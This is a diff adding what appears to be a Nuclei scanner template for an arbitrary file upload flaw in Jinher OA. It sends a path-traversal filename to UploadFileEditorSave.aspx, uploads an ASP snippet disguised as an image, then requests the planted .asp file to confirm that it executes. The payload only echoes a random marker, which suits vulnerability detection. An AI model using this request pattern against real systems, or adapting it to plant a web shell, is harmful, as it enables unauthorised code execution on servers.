@@ -1,0 +1,49 @@
+id: poc-yaml-jinher-oa-uploadfileeditorsave-anyfile-upload
+info:
+  name: 金和OA uploadfileeditorsave任意文件上传漏洞
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    金和OA 协同办公管理系统存在任意文件上传漏洞，可通过特殊构造的请求上传恶意文件。
+
+variables:
+  filename: "{{rand_base(8)}}"
+  content: "{{rand_base(32)}}"
+  boundary: "{{rand_base(20)}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/C6/Control/UploadFileEditorSave.aspx?filename=\\..\\..\\C6\\{{filename}}.asp"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----{{boundary}}"
+    body: |
+      ------{{boundary}}
+      Content-Disposition: form-data; name="file"; filename="{{filename}}.jpg"
+      Content-Type: image/png
+
+      <% response.write("{{content}}") %>
+
+      ------{{boundary}}--
+    matchers:
+      - type: status
+        status:
+          - 200
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/C6/{{filename}}.asp"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{content}}"
